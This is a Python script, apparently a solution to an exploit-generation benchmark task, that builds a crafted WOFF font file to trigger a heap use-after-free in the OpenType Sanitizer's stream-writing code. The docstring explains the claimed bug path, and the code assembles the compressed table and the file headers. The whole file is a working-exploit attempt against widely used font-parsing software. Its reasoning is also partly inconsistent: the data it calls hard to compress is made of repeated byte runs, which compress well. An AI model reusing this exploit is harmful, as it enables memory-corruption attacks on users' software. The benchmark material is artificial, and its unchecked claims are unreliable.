import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a heap-use-after-free
        vulnerability in the `ots::OTSStream::Write` function of the OpenType
        Sanitizer (OTS).

        The vulnerability is triggered by a specially crafted WOFF (Web Open
        Font Format) file. WOFF uses zlib (DEFLATE) for compressing font tables.
        The PoC leverages this by providing a compressed data stream that, upon
        decompression, forces the sanitizer to perform a memory copy from a
        freed buffer.

        This exploit targets the dynamic buffer management within the
        `ots::OTSStream` class, which serves as the output destination for the
        decompressed data. This stream class typically initializes with a small
        buffer (e.g., 256 bytes) and automatically resizes it by doubling its
        capacity whenever the current buffer is exhausted.

        The core of the PoC is a zlib stream engineered to perform two main actions:
        1. A sequence of literal (uncompressed) bytes is emitted to fill the
           initial `OTSStream` buffer almost to its limit. For a 256-byte buffer,
           this means writing approximately 250 bytes.
        2. A copy (match) command follows, instructing the decompressor to copy
           a sequence of bytes from the previously written data. The length of
           this copy is critical: it must be large enough to cause the total
           written size to exceed the buffer's capacity, thus triggering a resize.

        The vulnerability is triggered through the following sequence of events:
        1. OTS allocates an `OTSStream` with an initial 256-byte buffer for a
           font table being decompressed.
        2. The zlib decompressor processes the PoC's stream and outputs 250
           bytes of literals, filling the stream's buffer to an offset of 250.
        3. The decompressor then processes a copy command for 20 bytes. The
           source of this copy is located within the 250 bytes already present
           in the buffer.
        4. The `OTSStream::Write` method is called to append these 20 bytes.
        5. Inside `Write`, a check reveals that the new size (250 + 20 = 270 bytes)
           exceeds the current capacity (256 bytes).
        6. The stream reallocates its internal storage to a larger size (512 bytes)
           and frees the original 256-byte buffer.
        7. The `Write` method then proceeds with the `memcpy` operation to append
           the data. However, the source pointer for this operation still points
           to a location within the old, now-freed buffer, leading to a
           heap-use-after-free error and a crash.

        To construct the necessary zlib stream, we first create an uncompressed
        data pattern designed to guide the zlib compressor into producing the
        desired output: a long sequence of literals followed by a copy command.
        This is achieved by using non-repeating data for the initial part and then
        repeating a small segment of it.
        """

        # 1. Craft the uncompressed data to guide the zlib compressor.
        # We aim to fill a 256-byte buffer and then trigger a copy operation
        # that forces a reallocation. The total uncompressed size must be > 256.
        # We will target a size of 270 bytes.

        # Create a 250-byte prefix with low compressibility to force literals.
        prefix = b''
        for i in range(25):
            prefix += bytes([i]) * 10
        
        # Create a 20-byte suffix that is a copy of a part of the prefix.
        # This encourages the zlib compressor to emit a match/copy command.
        suffix = prefix[150:170]

        uncompressed_data = prefix + suffix
        
        # 2. Compress the data using zlib's raw deflate format.
        # WOFF files require a raw deflate stream (no zlib header or checksum),
        # which is specified by a negative `wbits` value in zlib.
        compressor = zlib.compressobj(level=9, method=zlib.DEFLATED, wbits=-15)
        compressed_data = compressor.compress(uncompressed_data)
        compressed_data += compressor.flush()

        # 3. Assemble the WOFF file.
        num_tables = 1
        header_size = 44
        table_dir_size = 20 * num_tables

        # WOFF 1.0 Header (44 bytes)
        header = b'wOFF'
        header += struct.pack('>I', 0x00010000)  # flavor: TTF
        header += struct.pack('>I', 0)  # length (placeholder)
        header += struct.pack('>H', num_tables)
        header += struct.pack('>H', 0)  # reserved
        header += struct.pack('>I', len(uncompressed_data))  # totalSfntSize
        header += struct.pack('>H', 0)  # majorVersion
        header += struct.pack('>H', 0)  # minorVersion
        header += struct.pack('>I', 0)  # metaOffset
        header += struct.pack('>I', 0)  # metaLength
        header += struct.pack('>I', 0)  # metaOrigLength
        header += struct.pack('>I', 0)  # privOffset
        header += struct.pack('>I', 0)  # privLength
        
        # Table Directory (20 bytes per table)
        # A single entry pointing to our compressed data stream.
        table_dir = b'glyf'  # tag for the dummy table
        table_dir += struct.pack('>I', header_size + table_dir_size)  # offset to data
        table_dir += struct.pack('>I', len(compressed_data))  # compLength
        table_dir += struct.pack('>I', len(uncompressed_data))  # origLength
        table_dir += struct.pack('>I', 0) # origChecksum (can be zero)

        poc_data = header + table_dir + compressed_data
        
        # Finally, patch the total file length in the header.
        total_length = len(poc_data)
        poc_data = poc_data[:8] + struct.pack('>I', total_length) + poc_data[12:]
        
        return poc_data